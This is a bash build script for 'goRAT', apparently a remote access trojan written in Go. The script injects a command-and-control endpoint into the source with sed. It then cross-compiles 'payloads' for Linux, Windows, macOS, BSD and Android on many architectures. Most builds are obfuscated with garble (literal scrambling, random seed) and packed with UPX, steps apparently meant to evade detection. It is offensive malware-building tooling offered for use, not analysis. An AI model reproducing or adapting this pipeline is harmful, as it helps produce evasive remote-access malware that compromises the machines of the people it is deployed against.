#!/usr/bin/env bash
source config.sh

# Vars and Flags
export PATH=$PATH:$(go env GOPATH)/bin
BASEDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
VERSION=`git rev-list --count HEAD`
BUILD_DIR="$BASEDIR/BUILD"
SRC_DIR="$BASEDIR/.BUILD_SOURCE"
CORE="goRAT.go"
COMPILE_CORE="$SRC_DIR/goRAT.go"


function Stage {
    # Clean Before Stage
    sudo rm -rf $BUILD_DIR
    sudo rm -rf $SRC_DIR
    mkdir $BUILD_DIR
    mkdir $SRC_DIR
    mkdir $BUILD_DIR/scripts
    mkdir $BUILD_DIR/payloads

    # Stage Files and Inject Vars Before Compile
    cp $CORE $COMPILE_CORE
    cp -r "$BASEDIR"/scripts/ "$BUILD_DIR"
    sed -i "s/@ENDPOINT_HERE@/$SERVER_DEST/g" "$COMPILE_CORE"
}

function Cleanup() {
    rm -rf "$SRC_DIR" 
}

function ProgressBar {
    let _progress=(${1}*100/${2}*100)/100
    let _done=(${_progress}*4)/10
    let _left=40-$_done
    _fill=$(printf "%${_done}s")
    _empty=$(printf "%${_left}s")
    printf "\rProgress : [${_fill// /#}${_empty// /-}] ${_progress}%%"
}

function BuildDocker {
    sudo docker build . -t gorat_build
    ID=$(sudo docker run -d gorat_build)
    sudo docker cp $ID:/GoRAT/BUILD/payloads $BUILD_DIR
    sudo docker stop $ID
    sudo docker rm $ID
}

function BuildAndroid {
  echo ""
  echo "Starting Android Payload Build... (NOT FULLY WORKING)"
    # Non-Garble Tests
    ProgressBar 0 2
    GOOS=android GOARCH=arm64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_android_arm64 "$COMPILE_CORE"
    ProgressBar 1 2
    GOOS=android GOARCH=arm GOARM=7 CC=arm-linux-gnueabihf-gcc CGO_ENABLED=1 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_android_arm "$COMPILE_CORE"
    ProgressBar 2 2
}

function BuildTest {
    # Non-Garble Tests
    ProgressBar 0 6
    GOOS=linux GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_64 "$COMPILE_CORE"
    ProgressBar 1 6
    GOOS=linux GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_mips_64 "$COMPILE_CORE"
    ProgressBar 2 6
    GOOS=darwin GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_macos_64 "$COMPILE_CORE"
    ProgressBar 3 6
    GOOS=windows GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_windows_64.exe "$COMPILE_CORE"
    ProgressBar 4 6
    GOOS=freebsd GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_64 "$COMPILE_CORE"
    ProgressBar 5 6
    GOOS=openbsd GOARCH=amd64 go build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_64 "$COMPILE_CORE"
    ProgressBar 6 6
}

function BuildGarble64() {
    echo ""
    echo "Starting 64bit Payload Garble..."

    ######################
    ## 64 Bit Systems
    ####################
    ProgressBar 0 15
    GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_64 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_64 1> /dev/null
    ProgressBar 1 15
    GOOS=linux GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM5 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM5 1> /dev/null
    ProgressBar 2 15
    GOOS=linux GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM6 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM6 1> /dev/null
    ProgressBar 3 15
    GOOS=linux GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM7 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM7 1> /dev/null
    ProgressBar 4 15
    GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_mips_64 "$COMPILE_CORE"
    # RIP no UPX for MIPS64
    ProgressBar 5 15

    GOOS=windows GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_windows_64.exe "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_windows_64.exe 1> /dev/null
    ProgressBar 6 15

    GOOS=darwin GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_macos_64 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_macos_64 1> /dev/null
    ProgressBar 7 15

    # RIP no UPX for freebsd
    GOOS=freebsd GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_64 "$COMPILE_CORE"
    ProgressBar 8 15
    GOOS=freebsd GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM5 "$COMPILE_CORE"
    ProgressBar 9 15
    GOOS=freebsd GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM6 "$COMPILE_CORE"
    ProgressBar 10 15
    GOOS=freebsd GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM7 "$COMPILE_CORE"
    ProgressBar 11 15

    # RIP no UPX for openbsd
    GOOS=openbsd GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_64 "$COMPILE_CORE"
    ProgressBar 12 15
    GOOS=openbsd GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM5 "$COMPILE_CORE"
    ProgressBar 13 15
    GOOS=openbsd GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM6 "$COMPILE_CORE"
    ProgressBar 14 15
    GOOS=openbsd GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM7 "$COMPILE_CORE"
    ProgressBar 15 15
}

function BuildGarble32() {
    echo ""
    echo "Starting 32bit Payload Garble..."

    ######################
    ## 32 Bit Systems
    ####################
    ProgressBar 0 14
    GOOS=linux GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_32 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_32 1> /dev/null
    ProgressBar 1 14
    GOOS=linux GOARCH=mips garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_mips_32 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_mips_32 1> /dev/null
    ProgressBar 2 14
    GOOS=linux GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM5 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM5 1> /dev/null
    ProgressBar 3 14
    GOOS=linux GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM6 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM6 1> /dev/null
    ProgressBar 4 14
    GOOS=linux GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM7 "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM7 1> /dev/null
    ProgressBar 5 14

    GOOS=windows GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_windows_32.exe "$COMPILE_CORE"
    upx "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_windows_32.exe 1> /dev/null
    ProgressBar 6 14

    # RIP no UPX for freebsd
    GOOS=freebsd GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_32 "$COMPILE_CORE"
    ProgressBar 7 14
    GOOS=freebsd GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM5 "$COMPILE_CORE"
    ProgressBar 8 14
    GOOS=freebsd GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM6 "$COMPILE_CORE"
    ProgressBar 9 14
    GOOS=freebsd GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM7 "$COMPILE_CORE"
    ProgressBar 10 14

    # RIP no UPX for openbsd
    GOOS=openbsd GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_32 "$COMPILE_CORE"
    ProgressBar 11 14
    GOOS=openbsd GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM5 "$COMPILE_CORE"
    ProgressBar 12 14
    GOOS=openbsd GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM6 "$COMPILE_CORE"
    ProgressBar 13 14
    GOOS=openbsd GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/payloads/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM7 "$COMPILE_CORE"
    ProgressBar 14 14
}

# Loop through arguments and process them
for arg in "$@"
do
    case $arg in
        
        -d|--docker)
            Stage
            BuildDocker
            ;;

        -a|--all)
            Stage
            BuildGarble64
            BuildGarble32
            BuildAndroid
            Cleanup
            ;;

        -32|--32bit)
            Stage
            BuildGarble32
            Cleanup
            ;;

        -64|--64bit)
            Stage
            BuildGarble64
            Cleanup
            ;;

        -m|--mobile)
            Stage
            BuildAndroid
            Cleanup
            ;;

        -t|--test)
            Stage
            BuildTest
            Cleanup
            ;;

        *)
            echo "usage: build_payload.sh"
            echo ""
            echo "    -a, --all          Builds all Payloads Garbled If Possible for each Arch/Distro Pair"
            echo "    -32, --32bit       Builds a Garbled Payload for each Arch/Distro Pair"
            echo "    -64, --64bit       Builds a Garbled Payload for each Arch/Distro Pair"
            echo "    -m, --mobile       Builds a Garbled Payload for each Arch/Distro Pair"
            echo "    -t, --test         Builds a Un-Garbled Payload on 64bit Archs Only"
            echo ""
            ;;
    esac
  done
